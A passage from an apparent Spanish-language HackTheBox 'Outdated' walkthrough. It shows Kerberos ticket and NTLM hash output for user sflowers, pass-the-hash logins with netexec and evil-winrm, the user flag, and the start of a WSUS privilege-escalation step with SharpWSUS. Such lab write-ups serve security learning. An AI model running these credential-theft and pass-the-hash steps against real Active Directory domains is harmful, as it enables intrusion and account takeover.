</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16</span><span>[*] Building AS-REQ (w/ PKINIT preauth) <span style="color:#fff;font-weight:bold">for</span>: <span style="color:#0ff;font-weight:bold">&#39;outdated.htb\sflowers&#39;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17</span><span>[*] Using domain controller: 10.129.229.239:88
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18</span><span>[+] TGT request successful!
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19</span><span>[*] base64(ticket.kirbi):
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21</span><span>      doIF0jCCBc6gAwIBBaEDAgEWooIE5zCCBONhggTfMIIE26ADAgEFoQ4bDE9VVERBVEVELkhUQqIhMB+g
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22</span><span>      AwIBAqEYMBYbBmtyYnRndBsMb3V0ZGF0ZWQuaHRio4IEnzCCBJugAwIBEqEDAgECooIEjQSCBIkNgqUw
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23</span><span>      FxPGj0Vpi4YqjMO7HqtC1sfkKNiM6+jvEGio9pJqaZGJcSN4uMVLljmRVKMPWOISyGfGxod1P6d7iKsM
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24</span><span>      WBSiJEFkS3o/E/PQ/hMCMOVSsd62Wct8vLe3jRfXZqUBFTWjDPg8tjT3cG8+SGWGt8w4OK4cK2URfQFV
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25</span><span>      63mqcBHOyZeEtCEZ5RzXiD6A2yuaozyAnwQF9ufUNIxOoTLIdLE7bI+3B730X3iWx7/Stkg9oiJKfHrI
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26</span><span>      lwrbY833wkAT9VIZrXfKsf3w58dZHr7aEUPOWKMOsAKnazIZw7Dgp5VYC1sUz+/RWxFV3VdWrYZ+tNGt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">27</span><span>      3inQ2ysFTf88UIGwB4sr0cSSPjzmjo/vAawShKwUvA6Cl1F+cDpVQOtVH5aslEmYj2pGfBKWP6O2TLSg
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">28</span><span>      bsO5g++0e9suCd+XgW8XT1PHNP2x+GNziA48ImUK99/C0IobPp1WMQlaDS2IeHoL4su47L8skTpDkmLm
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">29</span><span>      IBVXWxkSURCkwZ+tNgnWJalOuLlyxfcZklCvq0WHtyfxPoMGd9UZndKHu0RYkeHkj9Fr3v4KlLRFI1p6
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">30</span><span>      TRrhP/UKFg8wycDw/AsYFx56DSwAej2meABA/pBYrZm/imEyPAmvlfoh7mRC3eHnC3PR/NWouvV1ArRK
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">31</span><span>      7kEQ/oM7F57QVhmrnYF+nOB3XZUDNxMcJl0QampA14PdFJ8mKp5QdUt5nEd4o3K5eTCgsKOS9DJBRbvP
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">32</span><span>      qi9UNgRLMWLQ+lxxxaqsWbnQh69tQufSjc2wcECc6dDpvEMDJzC1v13Od++DrehUm8hi4SZ+BF9arbBH
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">33</span><span>      mXAVegpJbvLdgWjJ1o9SU1wcJwT7lrnmNiI9oUaVVeRIHjmN4hf47XGrXCqSNKhl7SBKjiqbjXvhxf+t
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">34</span><span>      QYzeoNznZlqrw6Lt8thf4yF8LcHwtXZdO6GzZ/2SE9gnf2A34QMQpFU8GwgGOY1v0uOH/kacYZ3MBXaU
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">35</span><span>      7E3OfGSWhYyoG24jfRrsGkXGzzzz7mvf28juQQYkbPTkVreWzP1nKdNGbZzyd+hhoPmSCynjQ51+gP7Z
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">36</span><span>      OnZMQ1AlG9VRxrmUOGWcfXvD8CPBXjKbdFNQQKY+btuGCA4Q+AfocMzUF0oEdVdrpUy9zDpITfH5WMge
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">37</span><span>      uo2VBoC+eaPFUCwVkhekVJrfVnOf7gy1kXdsIdGPT/+XL1OpQRxCN0o4lIfoqx6vsP2V2sA+ZIl6Luah
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">38</span><span>      +8jXX5fUkPP7S4bCqFyz6bciz+1HtNYotLtHrOz+b3XJOvq50smTUbnjVyTCgMpdrn6zaDaMeKRX57dr
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">39</span><span>      JqY2ot7WfIAD/Mt1fDiH7sae58dtyp88yNPsY5HA0PzRBDEXatHx04gpcLY5+vn4dDp839Z8h8/dxmz+
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">40</span><span>      UqcV6BzzBfz2yLrGApzJdoeNUHaQUQpgZaKid9OlqnW66xRjS/+wYrYZP5yzG3/+WtX6QfrzfyTyKMiq
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">41</span><span>      HS3VNZvyDQzo+YNnS0Q61DV5CXqizywvTGJyVgMPShTi0XC5CNtHG+mN/GMr5kxg9VCobc69faE40s7E
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">42</span><span>      HzjAWziXc/8P8Wl5zoxNr/2jgdYwgdOgAwIBAKKBywSByH2BxTCBwqCBvzCBvDCBuaAbMBmgAwIBF6ES
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">43</span><span>      BBAFrkBjShO/TIx+WQr1VmFToQ4bDE9VVERBVEVELkhUQqIVMBOgAwIBAaEMMAobCHNmbG93ZXJzowcD
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">44</span><span>      BQBA4QAApREYDzIwMjQwODI3MDI0NTM1WqYRGA8yMDI0MDgyNzEyNDUzNVqnERgPMjAyNDA5MDMwMjQ1
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">45</span><span>      MzVaqA4bDE9VVERBVEVELkhUQqkhMB+gAwIBAqEYMBYbBmtyYnRndBsMb3V0ZGF0ZWQuaHRi
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">46</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">47</span><span>  ServiceName              :  krbtgt/outdated.htb
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">48</span><span>  ServiceRealm             :  OUTDATED.HTB
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">49</span><span>  UserName                 :  sflowers (NT_PRINCIPAL)
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">50</span><span>  UserRealm                :  OUTDATED.HTB
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">51</span><span>  StartTime                :  8/26/2024 7:45:35 PM
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">52</span><span>  EndTime                  :  8/27/2024 5:45:35 AM
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">53</span><span>  RenewTill                :  9/2/2024 7:45:35 PM
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">54</span><span>  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">55</span><span>  KeyType                  :  rc4_hmac
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">56</span><span>  Base64(key)              :  Ba5AY0oTv0yMflkK9VZhUw==
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">57</span><span>  ASREP (key)              :  9B41916C3A54EF74979703ADF94F0A0A
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">58</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">59</span><span>[*] Getting credentials using U2U
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">60</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">61</span><span>  CredentialInfo         :
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">62</span><span>    Version              : <span style="color:#ff0;font-weight:bold">0</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">63</span><span>    EncryptionType       : rc4_hmac
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">64</span><span>    CredentialData       :
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">65</span><span>      CredentialCount    : <span style="color:#ff0;font-weight:bold">1</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">66</span><span>       NTLM              : 1FCDB1F6015DCB318CC77BB2BDA14DB5
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">67</span><span>PS C:<span style="color:#0ff;font-weight:bold">\U</span>sers<span style="color:#0ff;font-weight:bold">\b</span>tables<span style="color:#0ff;font-weight:bold">\D</span>ocuments&gt; </span></span></code></pre></div>
<p>Y ahí obtenemos un hash NTLM</p>
<p>Lo podemos comprobar con <code>netexec</code></p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>nxc smb 10.129.229.239 -u <span style="color:#0ff;font-weight:bold">&#39;sflowers&#39;</span> -H <span style="color:#0ff;font-weight:bold">&#39;1FCDB1F6015DCB318CC77BB2BDA14DB5&#39;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>SMB         10.129.229.239  <span style="color:#ff0;font-weight:bold">445</span>    DC               [*] Windows <span style="color:#ff0;font-weight:bold">10</span> / Server <span style="color:#ff0;font-weight:bold">2019</span> Build <span style="color:#ff0;font-weight:bold">17763</span> x64 (name:DC) (domain:outdated.htb) (signing:True) (SMBv1:False)
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>SMB         10.129.229.239  <span style="color:#ff0;font-weight:bold">445</span>    DC               [+] outdated.htb<span style="color:#0ff;font-weight:bold">\s</span>flowers:1FCDB1F6015DCB318CC77BB2BDA14DB5</span></span></code></pre></div>
<p>Y podemos comprobar también si efectivamente está en el grupo <code>Remote Management Users</code></p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>nxc winrm 10.129.229.239 -u <span style="color:#0ff;font-weight:bold">&#39;sflowers&#39;</span> -H <span style="color:#0ff;font-weight:bold">&#39;1FCDB1F6015DCB318CC77BB2BDA14DB5&#39;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>WINRM       10.129.229.239  <span style="color:#ff0;font-weight:bold">5985</span>   DC               [*] Windows <span style="color:#ff0;font-weight:bold">10</span> / Server <span style="color:#ff0;font-weight:bold">2019</span> Build <span style="color:#ff0;font-weight:bold">17763</span> (name:DC) (domain:outdated.htb)
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>WINRM       10.129.229.239  <span style="color:#ff0;font-weight:bold">5985</span>   DC               [+] outdated.htb<span style="color:#0ff;font-weight:bold">\s</span>flowers:1FCDB1F6015DCB318CC77BB2BDA14DB5 (Pwn3d!)</span></span></code></pre></div>
<p>Y ya podemos conseguir una consola como <code>sflowers</code></p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>evil-winrm -i 10.129.229.239 -u sflowers -H <span style="color:#0ff;font-weight:bold">&#39;1FCDB1F6015DCB318CC77BB2BDA14DB5&#39;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>                                        
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>Evil-WinRM shell v3.5
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>                                        
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span style="color:#fff;font-weight:bold">function</span> is unimplemented on this machine
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>                                        
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>                                        
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>Info: Establishing connection to remote endpoint
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>*Evil-WinRM* PS C:<span style="color:#0ff;font-weight:bold">\U</span>sers<span style="color:#0ff;font-weight:bold">\s</span>flowers<span style="color:#0ff;font-weight:bold">\D</span>ocuments&gt; whoami
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>outdated<span style="color:#0ff;font-weight:bold">\s</span>flowers</span></span></code></pre></div>
<p>También podemos leer la flag de usuario.</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>*Evil-WinRM* PS C:<span style="color:#0ff;font-weight:bold">\U</span>sers<span style="color:#0ff;font-weight:bold">\s</span>flowers<span style="color:#0ff;font-weight:bold">\D</span>esktop&gt; <span style="color:#fff;font-weight:bold">type</span> user.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>201cccf8d3ce2...</span></span></code></pre></div>
<h1 id="privilege-escalation">Privilege Escalation</h1>
<p>Enumerando la máquina, vemos que <code>sflowers</code> pertenece a un grupo llamado <code>WSUS Administrators</code></p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>*Evil-WinRM* PS C:<span style="color:#0ff;font-weight:bold">\U</span>sers<span style="color:#0ff;font-weight:bold">\s</span>flowers<span style="color:#0ff;font-weight:bold">\D</span>esktop&gt; net user sflowers
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>User name                    sflowers
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>Full Name                    Susan Flowers
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>Comment
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>User<span style="color:#f00">&#39;</span>s comment
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>Country/region code          <span style="color:#ff0;font-weight:bold">000</span> (System Default)
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>Account active               Yes
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>Account expires              Never
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>Password last <span style="color:#fff;font-weight:bold">set</span>            6/20/2022 11:04:09 AM
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>Password expires             Never
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>Password changeable          6/21/2022 11:04:09 AM
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span>Password required            Yes
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14</span><span>User may change password     No
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16</span><span>Workstations allowed         All
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17</span><span>Logon script
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18</span><span>User profile
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19</span><span>Home directory
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20</span><span>Last logon                   8/26/2024 7:45:35 PM
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22</span><span>Logon hours allowed          All
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24</span><span>Local Group Memberships      *Remote Management Use*WSUS Administrators
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25</span><span>Global Group memberships     *Domain Users
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26</span><span>The <span style="color:#fff;font-weight:bold">command</span> completed successfully.</span></span></code></pre></div>
<p>Después de leer e investigar un rato me encontré <a href="https://labs.nettitude.com/blog/introducing-sharpwsus/">este post</a> donde habla de un binario llamado SharpWSUS.exe</p>
<p>Nos vamos a descargar el repositorio y a compilarlo.
<a href="https://github.com/nettitude/SharpWSUS">https://github.com/nettitude/SharpWSUS</a></p>
<p>Una vez lo tengamos en la máquina víctima, el primer paso es encontrar el servidor WSUS.</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>*Evil-WinRM* PS C:<span style="color:#0ff;font-weight:bold">\U</span>sers<span style="color:#0ff;font-weight:bold">\s</span>flowers<span style="color:#0ff;font-weight:bold">\D</span>esktop&gt; .<span style="color:#0ff;font-weight:bold">\S</span>harpWSUS.exe locate
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span> ____  _                   __        ______  _   _ ____
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>/ ___|| |__   __ _ _ __ _ _<span style="color:#0ff;font-weight:bold">\ \ </span>     / / ___|| | | / ___|
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span><span style="color:#0ff;font-weight:bold">\_</span>__ <span style="color:#0ff;font-weight:bold">\|</span> <span style="color:#0ff;font-weight:bold">&#39;_ \ / _` | &#39;</span>__| <span style="color:#f00">&#39;</span>_ <span style="color:#0ff;font-weight:bold">\ \ </span>/<span style="color:#0ff;font-weight:bold">\ </span>/ /<span style="color:#0ff;font-weight:bold">\_</span>__ <span style="color:#0ff;font-weight:bold">\|</span> | | <span style="color:#0ff;font-weight:bold">\_</span>__ <span style="color:#0ff;font-weight:bold">\
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span><span style="color:#0ff;font-weight:bold"></span> ___) | | | | (_| | |  | |_) <span style="color:#0ff;font-weight:bold">\ </span>V  V /  ___) | |_| |___) |
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>|____/|_| |_|<span style="color:#0ff;font-weight:bold">\_</span>_,_|_|  | .__/ <span style="color:#0ff;font-weight:bold">\_</span>/<span style="color:#0ff;font-weight:bold">\_</span>/  |____/ <span style="color:#0ff;font-weight:bold">\_</span>__/|____/
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>                       |_|
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>           Phil Keeble @ Nettitude Red Team
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>[*] Action: Locate WSUS Server
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>WSUS Server: http://wsus.outdated.htb:8530
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span>
